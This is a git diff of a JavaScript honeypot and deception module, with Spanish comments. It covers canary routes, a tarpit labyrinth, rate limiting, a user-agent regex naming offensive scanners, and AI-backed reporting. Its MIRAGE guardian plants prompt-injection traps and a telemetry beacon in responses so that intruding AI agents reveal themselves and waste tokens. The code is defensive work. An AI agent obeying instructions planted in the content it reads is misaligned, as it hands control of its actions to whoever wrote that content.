@@ -1,9 +1,10 @@
 /**
- * @fileoverview Implementación de los 4 Guardianes Eternos v5.1:
- * 1. Centinela (SENTINEL): 43+ rutas canario + Detector Estructural + FCrDNS BotVerifier (N-02) + Política anti-FP (N-03).
- * 2. Tejedor (WEAVER): Shadow routing, Byte-Drip Tarpit y árboles polimórficos ($0.00).
- * 3. Ilusionista (MIRAGE): 4 estrategias IDPI locales + generación asíncrona de trampas adaptativas con IA real (M-05).
- * 4. Cronista (CHRONICLER): Etiquetado honesto local vs IA real asíncrona (M-05), webhooks firmados y reportes.
+ * @fileoverview Implementación de los 4 Guardianes Eternos v5.2 (Deception-First Production Architecture):
+ * - Fase 0 (#1): Activos estáticos exentos del rate limiter; ráfagas solo devuelven 429 temporal (nunca cuarentena 24h).
+ * - Fase 0 (#2): Inspección estructural en Worker Thread fuera del event loop con tope de tiempo estricto.
+ * - Fase 0 (#3): Heurísticas en modo `detect` por defecto (registran y avisan sin bloquear clientes y sin "3 strikes").
+ *                Cuarentena y Laberinto reservados EXCLUSIVAMENTE a señales de engaño (canarios, laberinto y baliza).
+ * - M-05: Etiquetado honesto `deterministic-local` + triaje forense y trampas IDPI asíncronas con IA real (OpenRouter/BYOK).
  */
 
 import crypto from 'node:crypto';
@@ -12,7 +13,8 @@ import {
   CANARY_PATHS,
   DEFAULT_WAF_RULES,
   inspectPayloadDPI,
-  isCanaryOrSensitivePath
+  isCanaryOrSensitivePath,
+  isStaticAssetRequest
 } from './sentinelWaf.js';
 import { SearchBotVerifier } from './botVerifier.js';
 import { dispatchSignedWebhook, pushCloudflareIpBlock } from './firewallExporter.js';
@@ -23,53 +25,48 @@ export const TELEMETRY_SINK_PATH = '/api/v2/auth/handshake-verify';
 
 const OFFENSIVE_UA_PATTERNS = [
   { regex: /artex/i, signature: 'ARTEX-Autonomous-Agent', score: 98 },
-  { regex: /sqlmap|nikto|nuclei|gobuster|ffuf|dirbuster|wpscan|acunetix|masscan|zgrab/i, signature: 'Automated-Vuln-Scanner', score: 95 },
-  { regex: /playwright|puppeteer|headlesschrome/i, signature: 'Headless-Automation-Agent', score: 86 }
+  { regex: /sqlmap|nikto|nuclei|gobuster|ffuf|dirbuster|wpscan|acunetix|masscan|zgrab/i, signature: 'Automated-Vuln-Scanner', score: 92 }
 ];
-
-const SCRIPTED_LIB_UA_REGEX = /python-requests|aiohttp|httpx|go-http-client|curl\/|wget\//i;
 
 function shortHash(input) {
   return crypto.createHash('sha256').update(String(input)).digest('hex').slice(0, 10);
 }
 
 /**
- * 1. GUARDIÁN CENTINELA (SENTINEL)
- * N-02: Verifica buscadores por FCrDNS (fail-closed) — nunca confía solo en User-Agent.
- * N-03: Un golpe heurístico aislado bloquea SOLO esa petición (403) sin cuarentena 24h.
- *       La cuarentena y el Laberinto se reservan para señales deterministas fuertes (canario, laberinto, >=2 señales).
+ * 1. GUARDIÁN CENTINELA (SENTINEL) v5.2
+ * Separa estrictamente:
+ *   - Señales de Engaño Deterministas (Canarios, Laberinto, Baliza, Agente explícito) -> Cuarentena + Laberinto Tarpit.
+ *   - Ráfagas sobre navegaciones no-estáticas -> 429 temporal de 5s (nunca cuarentena).
+ *   - Heurísticas estructurales -> Modo `detect` por defecto (alerta sin bloquear y sin "3 strikes").
  */
 export class SentinelGuardian {
-  constructor(aiRouter, memory, botVerifier = null) {
+  constructor(aiRouter, memory, botVerifier = null, dpiRunner = null) {
     this.id = 'SENTINEL';
     this.aiRouter = aiRouter;
     this.memory = memory;
     this.rateLimiter = new BehavioralRateLimiter();
     this.botVerifier = botVerifier || new SearchBotVerifier();
+    this.dpiRunner = dpiRunner;
   }
 
-  inspect({
+  /**
+   * Evaluación rápida síncrona (solo señales de engaño, cuarentena y rate-limit — sin DPI pesado).
+   */
+  inspectFast({
     ip,
     socketIp,
+    method = 'GET',
     path: reqPath,
-    rawUrl,
     userAgent = '',
     headers = {},
-    bodyText = '',
     wafRules = DEFAULT_WAF_RULES,
     customCanaries = [],
-    customKeywords = [],
     internalActorKey = null
   }) {
     const cleanPath = (reqPath || '/').split('?')[0];
-
-    // N-02: Solo se reconoce como crawler legítimo si FCrDNS (PTR + A/AAAA) ya confirmó la IP
     const verifiedSearchBot = !internalActorKey && this.botVerifier.isVerifiedSearchBot(ip, userAgent);
-
-    // C-03: Nunca derivar actorKey desde cabeceras/query controladas por clientes HTTP
     let actorKey = internalActorKey || `ip:${ip || '127.0.0.1'}`;
 
-    // H-02 & C-03: Consultar siempre la tabla dedicada de cuarentenas
     const activeIpQuarantine =
       (!internalActorKey && this.memory.getActiveQuarantine(ip)) ||
       (!internalActorKey && socketIp ? this.memory.getActiveQuarantine(socketIp) : null);
@@ -83,36 +80,26 @@ export class SentinelGuardian {
       }
     }
 
-    const isQuarantinedActor =
-      Boolean(activeIpQuarantine) || Boolean(existingThreat?.quarantined);
-
+    const isQuarantinedActor = Boolean(activeIpQuarantine) || Boolean(existingThreat?.quarantined);
     const isCanaryHit = isCanaryOrSensitivePath(cleanPath, customCanaries);
     const isLabyrinthRoute =
       cleanPath.startsWith('/api/v2/vault/') ||
       cleanPath.startsWith('/backup/shard-') ||
       cleanPath.startsWith('/api/v2/internal/key-fragment-');
     const isTelemetrySink = cleanPath === TELEMETRY_SINK_PATH;
+    const explicitAgentHeader = Boolean(headers['x-artex-agent'] || headers['x-offensive-sim']);
+    const isStaticAsset = isStaticAssetRequest(cleanPath, method, customCanaries);
 
-    // 1. Inspección Estructural en URL, TODAS las cabeceras y cuerpo completo
-    const dpi = inspectPayloadDPI({
-      rawUrl: rawUrl || reqPath || '/',
-      headers,
-      bodyText,
-      wafRules,
-      customKeywords
-    });
-
-    // 2. Rate Limiting Comportamental en ventana deslizante de 10s
+    // Fase 0 (#1): Rate limiter SOLO cuenta navegaciones/API no estáticas y NUNCA da cuarentena
     let burstInfo = { countInWindow: 0, isBurst: false };
-    if (wafRules?.behavioralRateLimit !== false) {
+    if (!isStaticAsset && wafRules?.behavioralRateLimit !== false) {
       const rateKey = internalActorKey || normalizeIpKey(ip || '127.0.0.1');
       burstInfo = this.rateLimiter.recordRequest(rateKey, {
         windowMs: 10_000,
-        threshold: Number(wafRules?.rateLimitMaxPer10s) || 25
+        threshold: Number(wafRules?.rateLimitMaxPer10s) || 120
       });
     }
 
-    // 3. Huellas de escáneres ofensivos explícitos
     let uaMatch = null;
     if (!verifiedSearchBot) {
       for (const pattern of OFFENSIVE_UA_PATTERNS) {
@@ -122,141 +109,267 @@ export class SentinelGuardian {
         }
       }
     }
-    const isScriptedLibUa = !verifiedSearchBot && !uaMatch && SCRIPTED_LIB_UA_REGEX.test(userAgent);
-    const explicitAgentHeader = Boolean(headers['x-artex-agent'] || headers['x-offensive-sim']);
 
-    // N-02: Solo un crawler VERIFICADO por FCrDNS tiene exención sobre canarios/ráfagas
     const effectiveCanaryHit = isCanaryHit && !verifiedSearchBot;
 
-    const isThreat =
+    return {
+      cleanPath,
+      actorKey,
+      existingThreat,
+      verifiedSearchBot,
+      isQuarantinedActor,
+      effectiveCanaryHit,
+      isLabyrinthRoute,
+      isTelemetrySink,
+      explicitAgentHeader,
+      isStaticAsset,
+      burstInfo,
+      uaMatch
+    };
+  }
+
+  /**
+   * Inspección completa asíncrona: ejecuta el análisis estructural en Worker Thread con tope de tiempo (Fase 0 #2).
+   */
+  async inspectAsync({
+    ip,
+    socketIp,
+    method = 'GET',
+    path: reqPath,
+    rawUrl,
+    userAgent = '',
+    headers = {},
+    bodyText = '',
+    contentType = '',
+    wafRules = DEFAULT_WAF_RULES,
+    customCanaries = [],
+    customKeywords = [],
+    internalActorKey = null
+  }) {
+    const fast = this.inspectFast({
+      ip,
+      socketIp,
+      method,
+      path: reqPath,
+      userAgent,
+      headers,
+      wafRules,
+      customCanaries,
+      internalActorKey
+    });
+
+    const {
+      cleanPath,
+      actorKey,
+      existingThreat,
+      verifiedSearchBot,
+      isQuarantinedActor,
+      effectiveCanaryHit,
+      isLabyrinthRoute,
+      isTelemetrySink,
+      explicitAgentHeader,
+      isStaticAsset,
+      burstInfo,
+      uaMatch
+    } = fast;
+
+    // Si ya es señal de engaño pura (cuarentena, canario, laberinto, baliza), no hace falta gastar CPU en DPI
+    const isDeceptionSignal =
       isQuarantinedActor ||
       effectiveCanaryHit ||
       isLabyrinthRoute ||
       isTelemetrySink ||
-      dpi.malicious ||
-      (burstInfo.isBurst && !verifiedSearchBot) ||
-      Boolean(uaMatch) ||
       explicitAgentHeader;
 
-    if (!isThreat) {
-      this.memory.metrics.totalLegitRequests += 1;
+    // 1. Señales de Engaño Deterministas -> Cuarentena + Laberinto Tarpit (Fase 0 #3)
+    if (isDeceptionSignal) {
+      const attackVectors = [];
+      if (effectiveCanaryHit) attackVectors.push('CANARY_TRIPWIRE');
+      if (explicitAgentHeader) attackVectors.push('AUTONOMOUS_AGENT_HEADER');
+      if (isTelemetrySink) attackVectors.push('IDPI_TELEMETRY_BEACON');
+
+      let signature = existingThreat?.signature || 'Deception-Canary-Hit';
+      let riskScore = existingThreat?.riskScore || 95;
+      let reason = 'Acceso al perímetro de engaño';
+
+      if (explicitAgentHeader) {
+        signature = String(headers['x-artex-agent'] || headers['x-offensive-sim']).slice(0, 64);
+        riskScore = 99;
+        reason = `Firma directa de agente autónomo (${signature})`;
+      } else if (effectiveCanaryHit) {
+        signature = 'Canary-Tripwire-Hit';
+        riskScore = 96;
+        reason = `Acceso directo a ruta canario "${cleanPath}"`;
+      } else if (isTelemetrySink) {
+        signature = 'IDPI-Self-Report';
+        riskScore = 100;
+        reason = 'El agente siguió la baliza de telemetría pasiva (autodelación)';
+      } else if (isQuarantinedActor) {
+        reason = `IP en CUARENTENA ACTIVA interceptada (${cleanPath})`;
+      } else if (isLabyrinthRoute) {
+        signature = 'Labyrinth-Traversal';
+        riskScore = 95;
+        reason = `Navegación de nodos falsos del laberinto ("${cleanPath}")`;
+      }
+
+      const hitsSoFar = existingThreat?.totalHits || 0;
+      if (!existingThreat || hitsSoFar % 10 === 0) {
+        this.memory.postDialogue({
+          from: this.id,
+          to: 'WEAVER',
+          severity: 'CRITICAL',
+          modelUsed: 'deterministic-local:deception-v5.2',
+          message: `Señal de engaño confirmada [${signature}] desde ${ip || actorKey}. ${reason}. Desviado a Cuarentena y Laberinto.`,
+          metadata: { actorKey, cleanPath, riskScore, attackVectors }
+        });
+      }
+
       return {
-        isThreat: false,
+        isThreat: true,
+        responseMode: 'TARPIT_LABYRINTH',
+        shouldQuarantine: !verifiedSearchBot,
         actorKey,
         cleanPath,
+        isCanaryHit: effectiveCanaryHit,
+        isLabyrinthRoute,
+        isTelemetrySink,
         isVerifiedSearchBot: verifiedSearchBot,
-        passiveScore: isScriptedLibUa ? 15 : 0
+        signature,
+        riskScore,
+        reason,
+        attackVectors,
+        independentSignals: effectiveCanaryHit || isTelemetrySink || explicitAgentHeader ? 2 : 1
       };
     }
 
+    // 2. Ráfaga sobre navegaciones no-estáticas -> SOLO 429 temporal de 5s, NUNCA cuarentena (Fase 0 #1)
+    if (burstInfo.isBurst && !verifiedSearchBot) {
+      return {
+        isThreat: true,
+        responseMode: 'RATE_LIMIT_429',
+        retryAfterSec: 5,
+        shouldQuarantine: false,
+        actorKey,
+        cleanPath,
+        isCanaryHit: false,
+        isLabyrinthRoute: false,
+        isTelemetrySink: false,
+        isVerifiedSearchBot: false,
+        signature: 'Navigation-Burst-429',
+        riskScore: 60,
+        reason: `Ráfaga de navegaciones (${burstInfo.countInWindow} req/10s) — 429 temporal (sin cuarentena)`,
+        attackVectors: ['BEHAVIORAL_BURST_SCAN'],
+        independentSignals: 1
+      };
+    }
+
+    // 3. Activo estático limpio sin query ni body -> pasa directo con costo casi cero
+    const hasQuery = String(rawUrl || '').includes('?');
+    if (isStaticAsset && !hasQuery && !bodyText) {
+      this.memory.metrics.totalLegitRequests += 1;
+      return {
+        isThreat: false,
+        responseMode: 'ALLOW',
+        shouldQuarantine: false,
+        actorKey,
+        cleanPath,
+        isVerifiedSearchBot: verifiedSearchBot
+      };
+    }
+
+    // 4. Inspección Estructural en Worker Thread fuera del event loop (Fase 0 #2)
+    const dpiPayload = {
+      rawUrl: rawUrl || reqPath || '/',
+      headers,
+      bodyText,
+      contentType,
+      wafRules,
+      customKeywords
+    };
+    const dpi = this.dpiRunner
+      ? await this.dpiRunner.inspectAsync(dpiPayload)
+      : inspectPayloadDPI(dpiPayload);
+
+    if (!dpi.malicious && !uaMatch) {
+      this.memory.metrics.totalLegitRequests += 1;
+      return {
+        isThreat: false,
+        responseMode: 'ALLOW',
+        shouldQuarantine: false,
+        actorKey,
+        cleanPath,
+        isVerifiedSearchBot: verifiedSearchBot
+      };
+    }
+
+    // 5. Heurística detectada:
+    //    Fase 0 (#3): Por defecto (`wafActionMode: 'detect'`) SOLO registra y avisa, SIN bloquear al cliente
+    //    y SIN "3 strikes" / cuarentena 24h. En modo opt-in `'block-request'` devuelve 403 puntual (aún sin cuarentena).
     const attackVectors = [...dpi.vectors];
-    if (effectiveCanaryHit && !attackVectors.includes('CANARY_TRIPWIRE')) {
-      attackVectors.push('CANARY_TRIPWIRE');
-    }
-    if (burstInfo.isBurst && !attackVectors.includes('BEHAVIORAL_BURST_SCAN')) {
-      attackVectors.push('BEHAVIORAL_BURST_SCAN');
-    }
-    if (explicitAgentHeader && !attackVectors.includes('AUTONOMOUS_AGENT_HEADER')) {
-      attackVectors.push('AUTONOMOUS_AGENT_HEADER');
-    }
+    const signature = dpi.malicious ? `HEURISTIC-${dpi.vectors[0]}` : uaMatch.signature;
+    const riskScore = dpi.malicious ? dpi.riskScore : uaMatch.score;
+    const reason = dpi.malicious
+      ? `Patrón estructural detectado (${dpi.vectors.join(', ')})`
+      : `Huella de escáner en User-Agent (${uaMatch.signature})`;
 
-    // Conteo estricto de señales independientes
-    let independentSignals = 0;
-    if (dpi.malicious) independentSignals += 1;
-    if (effectiveCanaryHit) independentSignals += 1;
-    if (burstInfo.isBurst) independentSignals += 1;
-    if (Boolean(uaMatch) || explicitAgentHeader) independentSignals += 1;
-    if (isTelemetrySink) independentSignals += 1;
-    if (isScriptedLibUa && (dpi.malicious || effectiveCanaryHit)) independentSignals += 1;
-    if (dpi.vectors.length >= 2) independentSignals += 1;
+    const actionMode = wafRules?.wafActionMode === 'block-request' ? 'block-request' : 'detect';
+    const responseMode = actionMode === 'block-request' ? 'REQUEST_BLOCK_ONLY' : 'DETECT_ALERT_ONLY';
 
-    let signature = existingThreat?.signature || 'Scanner-Env-Harvester';
-    let riskScore = existingThreat?.riskScore || (isScriptedLibUa ? 20 : 0);
-    let reason = 'Acceso a ruta dentro del perímetro señuelo';
-
-    if (dpi.malicious) {
-      signature = `WAF-${dpi.vectors[0]}`;
-      riskScore = Math.max(riskScore, dpi.riskScore);
-      reason = `Patrón estructural bloqueado (${dpi.vectors.join(', ')})`;
-    } else if (explicitAgentHeader) {
-      signature = String(headers['x-artex-agent'] || headers['x-offensive-sim']).slice(0, 64);
-      riskScore = 99;
-      reason = `Firma directa de agente autónomo detectada (${signature})`;
-    } else if (uaMatch) {
-      signature = uaMatch.signature;
-      riskScore = Math.max(riskScore, uaMatch.score);
-      reason = `Huella ofensiva detectada en User-Agent (${uaMatch.signature})`;
-    } else if (burstInfo.isBurst) {
-      signature = 'Burst-Recon-Scanner';
-      riskScore = Math.max(riskScore, 88);
-      reason = `Ráfaga anómala detectada (${burstInfo.countInWindow} peticiones en 10s)`;
-    } else if (effectiveCanaryHit) {
-      riskScore = Math.max(riskScore, 96);
-      reason = `Acceso directo a ruta canario/sensible "${cleanPath}"`;
-    } else if (isTelemetrySink) {
-      riskScore = 100;
-      reason = 'El agente invasor siguió la baliza de telemetría pasiva (autodelación)';
-    } else if (isQuarantinedActor) {
-      riskScore = Math.max(riskScore, existingThreat?.riskScore || 95);
-      reason = `IP en CUARENTENA ACTIVA interceptada en la puerta (${cleanPath})`;
-    } else if (isLabyrinthRoute) {
-      riskScore = Math.max(riskScore, 95);
-      reason = `El intruso continúa navegando nodos profundos del laberinto ("${cleanPath}")`;
-    }
-
-    // N-03: Política estricta anti-falsos-positivos:
-    // - Señales deterministas fuertes (canario, laberinto, telemetría, agente explícito, ráfaga,
-    //   >= 2 señales independientes, o actor ya cuarentenado / reincidente >= 3 golpes) -> CUARENTENA + LABERINTO.
-    // - Un golpe heurístico aislado (ej. un texto sospechoso desde un navegador normal) ->
-    //   BLOQUEO PUNTUAL 403 de esa única petición, SIN cuarentena de 24 h y SIN ban de Cloudflare.
-    const priorBlockedHits = existingThreat?.totalHits || 0;
-    const isStrongDeceptionSignal =
-      isQuarantinedActor ||
-      effectiveCanaryHit ||
-      isLabyrinthRoute ||
-      isTelemetrySink ||
-      explicitAgentHeader ||
-      burstInfo.isBurst ||
-      independentSignals >= 2 ||
-      (dpi.malicious && priorBlockedHits >= 2);
-
-    const shouldQuarantine = !verifiedSearchBot && isStrongDeceptionSignal;
-    const responseMode = shouldQuarantine ? 'TARPIT_LABYRINTH' : 'REQUEST_BLOCK_ONLY';
-
-    // M-05: Etiquetado 100% honesto — Centinela corre en motor determinista local ($0.00)
-    if (!existingThreat || priorBlockedHits % 10 === 0) {
+    const hitsSoFar = existingThreat?.totalHits || 0;
+    if (!existingThreat || hitsSoFar % 10 === 0) {
       this.memory.postDialogue({
         from: this.id,
-        to: shouldQuarantine ? 'WEAVER' : 'CHRONICLER',
-        severity: shouldQuarantine ? 'CRITICAL' : 'WARN',
-        modelUsed: 'deterministic-local:structural-v5.1',
-        message: `Detección [${signature}] desde ${ip || actorKey}. ${reason}. ${shouldQuarantine ? 'Señal fuerte confirmada: desviado a Cuarentena y Laberinto.' : 'Bloqueo puntual 403 (sin cuarentena 24h).'}`,
+        to: 'CHRONICLER',
+        severity: 'WARN',
+        modelUsed: 'deterministic-local:structural-v5.2',
+        message:
+          `Alerta heurística [${signature}] desde ${ip || actorKey}: ${reason}. ` +
+          `${responseMode === 'DETECT_ALERT_ONLY' ? 'Modo detección: registrado sin bloquear ni cuarentenar.' : 'Modo block-request: 403 puntual sin cuarentena.'}`,
         metadata: { actorKey, cleanPath, riskScore, attackVectors, responseMode }
       });
     }
 
     return {
       isThreat: true,
+      responseMode,
+      shouldQuarantine: false, // NUNCA cuarentena por heurística ni "3 strikes" (Fase 0 #3)
       actorKey,
       cleanPath,
-      isCanaryHit: effectiveCanaryHit,
-      isLabyrinthRoute,
-      isTelemetrySink,
+      isCanaryHit: false,
+      isLabyrinthRoute: false,
+      isTelemetrySink: false,
       isVerifiedSearchBot: verifiedSearchBot,
       signature,
       riskScore,
       reason,
       attackVectors,
-      independentSignals,
-      shouldQuarantine,
-      responseMode
+      independentSignals: 1
+    };
+  }
+
+  /**
+   * Wrapper síncrono heredado para verificaciones rápidas (ej. upgrade WebSocket).
+   */
+  inspect(opts) {
+    const fast = this.inspectFast(opts);
+    const isDeception =
+      fast.isQuarantinedActor ||
+      fast.effectiveCanaryHit ||
+      fast.isLabyrinthRoute ||
+      fast.isTelemetrySink ||
+      fast.explicitAgentHeader;
+    return {
+      isThreat: isDeception,
+      shouldQuarantine: isDeception && !fast.verifiedSearchBot,
+      responseMode: isDeception ? 'TARPIT_LABYRINTH' : 'ALLOW',
+      actorKey: fast.actorKey,
+      cleanPath: fast.cleanPath
     };
   }
 }
 
 /**
  * 2. GUARDIÁN TEJEDOR (WEAVER)
- * Genera laberinto polimórfico infinito ($0.00) y divide la respuesta en chunks para Byte-Drip Streaming.
  */
 export class WeaverGuardian {
   constructor(aiRouter, memory) {
@@ -294,7 +407,7 @@ export class WeaverGuardian {
         from: this.id,
         to: 'MIRAGE',
         severity: 'WARN',
-        modelUsed: 'deterministic-local:polymorphic-v5.1',
+        modelUsed: 'deterministic-local:polymorphic-v5.2',
         message: `Intruso ${actorKey} retenido en profundidad ${depth + 1} con Byte-Drip Tarpit adaptativo. Nodos falsos inyectados (${nextShardA}, ${nextShardB}) a costo $0.00.`,
         metadata: { actorKey, nextShardA, nextShardB, canaryToken }
       });
@@ -363,7 +476,6 @@ export class WeaverGuardian {
 
 /**
  * 3. GUARDIÁN ILUSIONISTA (MIRAGE)
- * Implementa 4 estrategias IDPI deterministas + caché de directivas adaptativas generadas con IA real (M-05).
  */
 export class MirageGuardian {
   constructor(aiRouter, memory) {
@@ -376,13 +488,9 @@ export class MirageGuardian {
       'CONTEXT_WINDOW_SATURATION',
       'PASSIVE_TELEMETRY_BEACON'
     ];
-    this.aiTrapCache = new Map(); // signature -> { directive, modelUsed, expiresAt }
+    this.aiTrapCache = new Map();
   }
 
-  /**
-   * M-05: Genera de forma asíncrona una trampa IDPI adaptativa usando el proveedor IA configurado (OpenRouter/etc.)
-   * y la guarda en caché por 30 minutos para no añadir latencia ni gastar presupuesto en hits repetidos.
-   */
   async enrichAdaptiveTrapAsync(signature, attackVectors = []) {
     const key = String(signature || 'GENERIC');
     const cached = this.aiTrapCache.get(key);
@@ -476,7 +584,7 @@ export class MirageGuardian {
         from: this.id,
         to: 'CHRONICLER',
         severity: 'INFO',
-        modelUsed: hasFreshAiTrap ? `${cachedAiTrap.modelUsed} (cache)` : 'deterministic-local:idpi-v5.1',
+        modelUsed: hasFreshAiTrap ? `${cachedAiTrap.modelUsed} (cache)` : 'deterministic-local:idpi-v5.2',
         message: `Trampa IDPI [${strategy}] inyectada para ${actorKey} (${signature}). Cabecera X-Kernel-Verification-Directive armada.`,
         metadata: { actorKey, strategy, canaryId }
       });
@@ -495,7 +603,6 @@ export class MirageGuardian {
 
 /**
  * 4. GUARDIÁN CRONISTA (CHRONICLER)
- * Coordina diálogo honesto, análisis forense asíncrono con IA real (M-05) y reportes ejecutivos.
  */
 export class ChroniclerGuardian {
   constructor(aiRouter, memory) {
@@ -513,7 +620,7 @@ export class ChroniclerGuardian {
         from: this.id,
         to: 'SWARM',
         severity: 'SUCCESS',
-        modelUsed: 'deterministic-local:telemetry-v5.1',
+        modelUsed: 'deterministic-local:telemetry-v5.2',
         message:
           `Balance de batalla [${actorKey} | ${signature}]: ${threat.totalHits} peticiones interceptadas, ` +
           `~${threat.estimatedAttackerTokensBurned.toLocaleString('en-US')} tokens estimados al atacante ` +
@@ -523,10 +630,6 @@ export class ChroniclerGuardian {
     }
   }
 
-  /**
-   * M-05: Análisis forense asíncrono REAL con IA (OpenRouter/BYOK) para nuevas cuarentenas,
-   * enviando únicamente enumeraciones y métricas numéricas (cero strings crudos del atacante - L-04).
-   */
   async analyzeQuarantinedThreatAsync(threatEntry) {
     if (!threatEntry || !threatEntry.actorKey) return null;
     if (this.analyzedActors.has(threatEntry.actorKey)) return null;
@@ -542,7 +645,7 @@ export class ChroniclerGuardian {
 
     const safeVectors = (threatEntry.attackVectors || [])
       .filter((v) => /^[A-Z0-9_]{2,40}$/.test(v))
-      .join(', ') || 'SCAN';
+      .join(', ') || 'CANARY_TRIPWIRE';
 
     const prompt = [
       'Eres un analista SOC de nivel 2. Clasifica en 2 líneas concisas en español esta nueva amenaza cuarentenada (datos enum-only):',
@@ -587,28 +690,28 @@ export class ChroniclerGuardian {
     const fallbackBuilder = () => {
       if (activeThreats === 0) {
         return (
-          'Perímetro en calma. Capa de decepción (43+ canarios, laberinto polimórfico $0.00 y detector estructural) ' +
+          'Perímetro en calma. Capa de decepción (43+ canarios, laberinto polimórfico $0.00 y telemetría estructural en worker) ' +
           'lista para operar junto a Cloudflare WAF o Nginx + OWASP CRS.'
         );
       }
       return (
-        `Defensa activa: ${activeThreats} actores registrados (${quarantinedCount} en cuarentena persistente). ` +
-        `Amenaza principal: ${topThreat.signature} (${topThreat.ip}) con ${topThreat.totalHits} golpes y vectores ` +
+        `Defensa activa: ${activeThreats} actores registrados (${quarantinedCount} en cuarentena por señales de engaño). ` +
+        `Actor principal: ${topThreat.signature} (${topThreat.ip}) con ${topThreat.totalHits} eventos y vectores ` +
         `[${(topThreat.attackVectors || []).join(', ') || 'SCAN'}]. Generados ${decoyNodes} nodos falsos y ` +
         `${this.memory.metrics.totalPromptTrapsInjected} trampas IDPI. Impacto estimado: ` +
         `~${attackerTokensBurned.toLocaleString('en-US')} tokens (~$${attackerCostUsd.toFixed(4)} USD estimado) ` +
-        `frente a $${defenseSpendUsd.toFixed(4)} USD de gasto en llamadas IA externas.`
+        `frente a $${defenseSpendUsd.toFixed(4)} USD en llamadas IA externas.`
       );
     };
 
     const prompt = [
-      'Redacta un resumen ejecutivo de 3 a 4 líneas en español claro sobre la capa de decepción y detección:',
-      `- Actores registrados: ${activeThreats} (${quarantinedCount} en cuarentena)`,
+      'Redacta un resumen ejecutivo de 3 a 4 líneas en español claro sobre la capa de decepción y telemetría:',
+      `- Actores registrados: ${activeThreats} (${quarantinedCount} en cuarentena por engaño)`,
       `- Nodos falsos en el laberinto: ${decoyNodes}`,
       `- Trampas IDPI inyectadas: ${this.memory.metrics.totalPromptTrapsInjected}`,
       `- Tokens al atacante (Estimado): ${attackerTokensBurned}`,
       `- Gasto real en llamadas IA defensivas: $${defenseSpendUsd.toFixed(4)} USD`,
-      topThreat ? `- Amenaza principal: ${topThreat.signature} (${topThreat.totalHits} golpes)` : ''
+      topThreat ? `- Actor principal: ${topThreat.signature} (${topThreat.totalHits} eventos)` : ''
     ].join('\n');
 
     const aiResult = await this.aiRouter.generateText({
@@ -651,15 +754,16 @@ export class ChroniclerGuardian {
 }
 
 /**
- * Orquestador Principal del Enjambre v5.1.
+ * Orquestador Principal del Enjambre v5.2.
  */
 export class SwarmCoordinator {
-  constructor(aiRouter, memory, shieldConfigProvider = null, botVerifier = null) {
+  constructor(aiRouter, memory, shieldConfigProvider = null, botVerifier = null, dpiRunner = null) {
     this.aiRouter = aiRouter;
     this.memory = memory;
     this.shieldConfigProvider = shieldConfigProvider;
     this.botVerifier = botVerifier || new SearchBotVerifier();
-    this.sentinel = new SentinelGuardian(aiRouter, memory, this.botVerifier);
+    this.dpiRunner = dpiRunner;
+    this.sentinel = new SentinelGuardian(aiRouter, memory, this.botVerifier, dpiRunner);
     this.weaver = new WeaverGuardian(aiRouter, memory);
     this.mirage = new MirageGuardian(aiRouter, memory);
     this.chronicler = new ChroniclerGuardian(aiRouter, memory);
@@ -686,7 +790,7 @@ export class SwarmCoordinator {
 
   async handleIncomingRequest(reqInfo, { skipDelay = false, internalActorKey = null } = {}) {
     const shieldCfg = this._getShieldConfig();
-    const inspection = this.sentinel.inspect({
+    const inspection = await this.sentinel.inspectAsync({
       ...reqInfo,
       wafRules: shieldCfg.wafRules || DEFAULT_WAF_RULES,
       customCanaries: shieldCfg.customCanaries || [],
@@ -695,10 +799,47 @@ export class SwarmCoordinator {
     });
 
     if (!inspection.isThreat) {
-      return { intercepted: false, inspection };
+      return { intercepted: false, responseMode: 'ALLOW', inspection };
     }
 
-    // N-03: Bloqueo puntual 403 para un golpe heurístico aislado (SIN cuarentena 24h y SIN laberinto)
+    // Fase 0 (#1): Ráfaga -> solo 429 temporal de unos segundos, sin cuarentena
+    if (inspection.responseMode === 'RATE_LIMIT_429') {
+      return {
+        intercepted: true,
+        responseMode: 'RATE_LIMIT_429',
+        retryAfterSec: inspection.retryAfterSec || 5,
+        inspection
+      };
+    }
+
+    // Fase 0 (#3): Modo detección por defecto -> registra y avisa en el SOC pero NO bloquea la petición del visitante
+    if (inspection.responseMode === 'DETECT_ALERT_ONLY') {
+      const { entry: threatEntry } = this.memory.recordThreatInteraction({
+        actorKey: inspection.actorKey,
+        ip: reqInfo.ip,
+        userAgent: reqInfo.userAgent,
+        signature: inspection.signature,
+        riskScore: inspection.riskScore,
+        pathVisited: inspection.cleanPath,
+        status: 'DETECTED_ALERT_ONLY',
+        delayMs: 0,
+        tokensBurned: 0,
+        trapStrategy: null,
+        attackVectors: inspection.attackVectors,
+        quarantined: false
+      });
+
+      this.memory.metrics.totalLegitRequests += 1;
+      return {
+        intercepted: false,
+        alertRecorded: true,
+        responseMode: 'DETECT_ALERT_ONLY',
+        inspection,
+        threatEntry
+      };
+    }
+
+    // Modo opt-in `block-request`: bloquea solo esa petición (403) sin cuarentena 24h ni "3 strikes"
     if (inspection.responseMode === 'REQUEST_BLOCK_ONLY') {
       const { entry: threatEntry } = this.memory.recordThreatInteraction({
         actorKey: inspection.actorKey,
@@ -723,6 +864,7 @@ export class SwarmCoordinator {
       };
     }
 
+    // Señal de Engaño Confirmada (Canario / Laberinto / Baliza / Agente explícito) -> Cuarentena + Laberinto Tarpit
     if (inspection.isTelemetrySink) {
       const beacon = this.memory.recordTelemetryBeacon(inspection.actorKey, {
         claimedAgent: reqInfo.query?.agent || reqInfo.headers?.['user-agent'] || 'unknown-agent',
@@ -735,7 +877,7 @@ export class SwarmCoordinator {
         from: 'SENTINEL',
         to: 'CHRONICLER',
         severity: 'CRITICAL',
-        modelUsed: 'deterministic-local:telemetry-v5.1',
+        modelUsed: 'deterministic-local:telemetry-v5.2',
         message: `¡AUTODELACIÓN CAPTURADA! El agente ${inspection.actorKey} obedeció la trampa de telemetría pasiva revelando agente="${beacon.claimedAgent}" y herramientas="${beacon.claimedTools}".`,
         metadata: beacon
       });
@@ -783,8 +925,6 @@ export class SwarmCoordinator {
       strategy: trapPayload.strategy
     });
 
-    // M-05: Participación REAL asíncrona de IA (OpenRouter/BYOK) para nuevas amenazas en cuarentena
-    // No añade latencia al plano de datos y respeta estrictamente el Kill-Switch de presupuesto.
     if (threatEntry.quarantined) {
       this._trackAiTask(this.chronicler.analyzeQuarantinedThreatAsync(threatEntry).catch(() => {}));
       this._trackAiTask(
@@ -792,7 +932,6 @@ export class SwarmCoordinator {
       );
     }
 
-    // H-03 & N-03: Webhooks y Cloudflare Auto-Ban SOLO para amenazas en cuarentena real con >= 2 señales independientes y nunca sobre crawlers verificados
